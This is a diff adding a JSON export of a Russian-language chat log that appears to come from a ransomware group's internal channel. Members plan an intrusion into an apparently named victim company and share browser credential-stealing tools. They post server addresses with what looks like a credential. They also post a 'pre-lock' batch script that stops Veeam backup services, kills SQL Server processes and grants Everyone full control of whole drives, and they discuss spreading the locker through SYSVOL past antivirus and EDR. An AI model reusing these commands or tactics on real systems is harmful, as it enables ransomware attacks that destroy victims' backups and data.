@@ -1,0 +1,616 @@
+{
+  "messages": [
+    {
+      "_id": "atobGfsK847QxRzQv",
+      "rid": "GENERAL",
+      "msg": "через пол часа",
+      "ts": "2020-12-24T23:04:02.210Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T23:04:02.242Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "C6gu2jfWPq66zFkMC",
+      "rid": "GENERAL",
+      "msg": "ее скоро снесут",
+      "ts": "2020-12-24T23:02:27.555Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T23:02:27.585Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dvaZmAmWimtZEKqE7",
+      "rid": "GENERAL",
+      "msg": "ребята, у кого что важное осталось в тпш заберите",
+      "ts": "2020-12-24T23:02:23.651Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T23:02:23.682Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dBsC75bugAYGXmyJq",
+      "rid": "GENERAL",
+      "msg": "понял",
+      "ts": "2020-12-24T22:58:12.064Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:58:12.104Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vrnpLuHX8rcizrzMW",
+      "rid": "GENERAL",
+      "msg": "и он скипаться будет при следующей попытке сетевого лока",
+      "ts": "2020-12-24T22:58:04.233Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:58:04.287Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Y6uz8rkufwcAMQfG7",
+      "rid": "GENERAL",
+      "msg": "как только процесс лока файла начинается на нем вешается флаг сразу",
+      "ts": "2020-12-24T22:57:58.423Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:57:58.447Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Q8csu95riducH5ja9",
+      "rid": "GENERAL",
+      "msg": "нет",
+      "ts": "2020-12-24T22:57:49.864Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:57:49.892Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ugeHXvgCdFtzPkadr",
+      "rid": "GENERAL",
+      "msg": "```\nон не конфликтит между собой? если с двух серверов, условно, придут к 1 арму где 1 уже начал процесс\n```",
+      "ts": "2020-12-24T22:57:49.337Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:57:49.395Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "dwvJSkB7iM5s3v7Ht",
+      "rid": "GENERAL",
+      "msg": "но если везде офф это дело то почему бы и нет",
+      "ts": "2020-12-24T22:57:46.069Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:57:46.104Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "9GvQdBnTxMmQfEyGH",
+      "rid": "GENERAL",
+      "msg": "но это толко при условии отключения авера само собой будет работать",
+      "ts": "2020-12-24T22:57:41.688Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:57:41.724Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kpbeAuoH2w6DBj5e9",
+      "rid": "GENERAL",
+      "msg": "можно так сделать\nнапример с SYSVOL шары которая по умолчанию доступна всем машинам домена",
+      "ts": "2020-12-24T22:57:35.878Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:57:35.905Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RhDTREPESJPm3yS8i",
+      "rid": "GENERAL",
+      "msg": "едр может убить?",
+      "ts": "2020-12-24T22:57:30.747Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:57:30.770Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Pb4md4ScAyD43ijrB",
+      "rid": "GENERAL",
+      "msg": "а может добавить в батник, что бы в конце он скачивал локер с какойнибудь шары и запускал?",
+      "ts": "2020-12-24T22:57:13.952Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-12-24T22:57:13.990Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LRis2G965E4Jv9Kgu",
+      "rid": "GENERAL",
+      "msg": "он не конфликтит между собой? если с двух серверов, условно, придут к 1 арму где 1 уже начал процесс",
+      "ts": "2020-12-24T22:57:00.639Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:57:00.666Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ndwcH3WSD5fnJyrJH",
+      "rid": "GENERAL",
+      "msg": "запускаем без аргументов и локер начнет сканировать сеть на доступные шары как закончит лочить \"у себя\" в тачке",
+      "ts": "2020-12-24T22:56:26.476Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:56:26.503Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "KbX7J8c7fgt6FxQSG",
+      "rid": "GENERAL",
+      "msg": "как видите он тормозит сервисы и киляет пиды которые могут держать хендлы + расшаривает диски",
+      "ts": "2020-12-24T22:55:20.153Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:55:20.187Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WJXeCDNRucPtoKwAi",
+      "rid": "GENERAL",
+      "msg": "```\n\"C:\\Windows\\system32\\net1 stop \\\"\"samss\\\"\" /y\"\n\"C:\\Windows\\system32\\net1 stop \\\"\"veeamcatalogsvc\\\"\" /y\"\n\"C:\\Windows\\system32\\net1 stop \\\"\"veeamcloudsvc\\\"\" /y\"\n\"C:\\Windows\\system32\\net1 stop \\\"\"veeamdeploysvc\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"samss\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamcatalogsvc\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamcloudsvc\\\"\" /y\"\n\"C:\\Windows\\System32\\net.exe\\\"\" stop \\\"\"veeamdeploysvc\\\"\" /y\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlbrowser.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlceip.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlservr.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM sqlwriter.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.agent.configurationservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.brokerservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.catalogdataservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.cloudservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.externalinfrastructure.dbprovider.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.manager.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.mountservice.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.service.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.uiserver.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.backup.wmiserver.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamdeploymentsvc.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamfilesysvsssvc.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeam.guest.interaction.proxy.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamnfssvc.exe /F\"\n\"C:\\Windows\\System32\\taskkill.exe\\\"\" /IM veeamtransportsvc.exe /F\"\n\"C:\\Windows\\system32\\taskmgr.exe\\\"\" /4\"\n\"C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding\"\n\"C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding\"\n\"icacls \\\"\"C:\\*\\\"\" /grant Everyone:F /T /C /Q\"\n\"icacls \\\"\"D:\\*\\\"\" /grant Everyone:F /T /C /Q\"\n```",
+      "ts": "2020-12-24T22:55:03.177Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:55:03.321Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2Wq2G5ZvTRt2ouCTF",
+      "rid": "GENERAL",
+      "msg": "вот пример \"прелок\" батника",
+      "ts": "2020-12-24T22:55:00.888Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-12-24T22:55:00.927Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "frLJCd8ue6Gb2wbhc",
+      "rid": "GENERAL",
+      "msg": "будем надеяться, что их не похавает))",
+      "ts": "2020-12-24T22:24:17.414Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-12-24T22:24:17.435Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pfZhz2WpGLpQKDeWE",
+      "rid": "GENERAL",
+      "msg": "у него там какието тулзы или он тоже шеллконкатом?",
+      "ts": "2020-12-24T22:22:58.689Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-12-24T22:22:58.718Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XnRqaWqMMTRdWkckT",
+      "rid": "GENERAL",
+      "msg": "в этой сети семантик злющий",
+      "ts": "2020-12-24T22:22:49.397Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:22:49.423Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7MeptQhYQrN7Nj946",
+      "rid": "GENERAL",
+      "msg": "ага пока его нагрузками поработайте",
+      "ts": "2020-12-24T22:22:37.604Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:22:37.634Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "biytBWSgeAnF4g8su",
+      "rid": "GENERAL",
+      "msg": "да, делает уже",
+      "ts": "2020-12-24T22:22:28.151Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-12-24T22:22:28.185Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "R6YkFb658TaW9toPE",
+      "rid": "GENERAL",
+      "msg": "Деп пришел?",
+      "ts": "2020-12-24T22:22:13.413Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T22:22:13.442Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zKvJMP26BqaHMyyru",
+      "rid": "GENERAL",
+      "msg": "новая коба",
+      "ts": "2020-12-24T16:48:30.830Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T16:48:30.859Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CLH8m7ZWR7e84CER9",
+      "rid": "GENERAL",
+      "msg": "```\n172.241.27.18\nhttps://agesk.com\n----------------------------------------------------------------------------------------\n209.222.97.8:62460\nTnRLaHoRRwyezbn6ybP1ed1xRlhtnAQAM5o\n```",
+      "ts": "2020-12-24T16:48:29.338Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T16:48:29.416Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "JPL7Sfmx6v2CuuPFs",
+      "rid": "GENERAL",
+      "msg": "Продолжаем искать доступ на нас",
+      "ts": "2020-12-24T15:42:20.275Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-12-24T15:42:20.305Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Xe9rShgxsBCKm9zrg",
+      "rid": "GENERAL",
+      "msg": "еще парралельно парни ущут доступ к насу",
+      "ts": "2020-12-24T15:40:05.776Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-12-24T15:40:05.841Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "aC748nCiTGHGaqT4t",
+      "rid": "GENERAL",
+      "msg": "+1",
+      "ts": "2020-12-24T15:40:05.258Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-12-24T15:40:05.306Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "zAorc5zgN6NHrTqh8",
+      "rid": "GENERAL",
+      "msg": "обсуждаем как бы пробраться в трасты в #wilsonart-com",
+      "ts": "2020-12-24T15:39:26.867Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-24T15:39:26.887Z",
+      "mentions": [],
+      "channels": [
+        {
+          "_id": "v3tBoYNZMCHwesdqJ",
+          "name": "wilsonart-com"
+        }
+      ]
+    },
+    {
+      "_id": "8YcskarpaRYTgYNJZ",
+      "rid": "GENERAL",
+      "msg": ":space_invader:",
+      "ts": "2020-12-24T15:38:45.090Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-12-24T15:38:45.125Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nZB4PTdjhzEyx8jz2",
+      "rid": "GENERAL",
+      "msg": "кто чем занят?",
+      "ts": "2020-12-24T15:38:42.073Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T15:38:42.118Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EfcRXH7NmYMzJPksb",
+      "rid": "GENERAL",
+      "msg": "привет",
+      "ts": "2020-12-24T15:38:27.078Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-12-24T15:38:27.109Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "b9wfgmzu7BuuGeg69",
+      "rid": "GENERAL",
+      "msg": "Всем привет",
+      "ts": "2020-12-24T15:38:16.806Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T15:38:16.846Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LTsY7rNKxytaY3mBX",
+      "rid": "GENERAL",
+      "msg": "спасибо)",
+      "ts": "2020-12-24T01:34:05.868Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T01:34:05.926Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oyCSd6vk2kkmuDrQq",
+      "rid": "GENERAL",
+      "ts": "2020-12-24T01:33:26.327Z",
+      "msg": "",
+      "file": {
+        "_id": "uoQDcpTDChfdEpJvh",
+        "name": "SharpWeb.exe",
+        "type": "application/x-ms-dos-executable"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "SharpWeb.exe",
+          "title_link": "/file-upload/uoQDcpTDChfdEpJvh/SharpWeb.exe",
+          "title_link_download": true,
+          "type": "file",
+          "description": "для коллекции)"
+        }
+      ],
+      "u": {
+        "_id": "MtKNTY3DtoTqRm2E3",
+        "username": "user7",
+        "name": "ahyhax"
+      },
+      "_updatedAt": "2020-12-24T01:33:26.347Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nH5DQDQ55L3uETpRk",
+      "rid": "GENERAL",
+      "msg": "спасибо",
+      "ts": "2020-12-24T01:32:45.600Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T01:32:45.657Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HG7WnJdh6o89tj3cm",
+      "rid": "GENERAL",
+      "ts": "2020-12-24T01:32:37.163Z",
+      "msg": "",
+      "file": {
+        "_id": "kGYXTBuywp9HpCDmd",
+        "name": "SharpChrome.exe",
+        "type": "application/x-ms-dos-executable"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "SharpChrome.exe",
+          "title_link": "/file-upload/kGYXTBuywp9HpCDmd/SharpChrome.exe",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-12-24T01:32:37.197Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "synkYQnryvsWRWPGP",
+      "rid": "GENERAL",
+      "ts": "2020-12-24T01:32:18.082Z",
+      "msg": "",
+      "file": {
+        "_id": "PDN6r3xK5sv6Sxui8",
+        "name": "SharpChromium.exe",
+        "type": "application/x-ms-dos-executable"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "SharpChromium.exe",
+          "title_link": "/file-upload/PDN6r3xK5sv6Sxui8/SharpChromium.exe",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-12-24T01:32:18.105Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rBwpppSgh2ACeTYXX",
+      "rid": "GENERAL",
+      "msg": "ребят, скиньте пожалуйста шарпхромиум билд",
+      "ts": "2020-12-24T01:31:00.007Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-12-24T01:31:00.042Z",
+      "mentions": [],
+      "channels": []
+    }
+  ],
+  "success": true
+}
